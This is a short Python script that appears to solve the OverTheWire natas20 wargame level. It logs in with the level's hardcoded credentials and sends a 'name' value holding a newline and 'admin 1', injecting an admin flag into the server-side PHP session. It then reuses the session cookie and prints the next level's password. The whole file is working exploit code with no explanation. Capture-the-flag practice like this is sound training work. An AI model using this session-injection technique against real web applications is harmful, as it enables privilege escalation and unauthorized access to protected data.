import requests

protocol = 'http://'
url = 'natas20.natas.labs.overthewire.org/'
username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
login = username + ':' + password + '@'
params = '?debug=&name=\nadmin 1'
target = protocol + login + url + params

r = requests.get( target )
c = r.cookies['PHPSESSID']
r = requests.get( target, cookies=dict( PHPSESSID=c ) )
idx = r.content.find('Password: ')
print r.content[ idx : idx + 42 ]
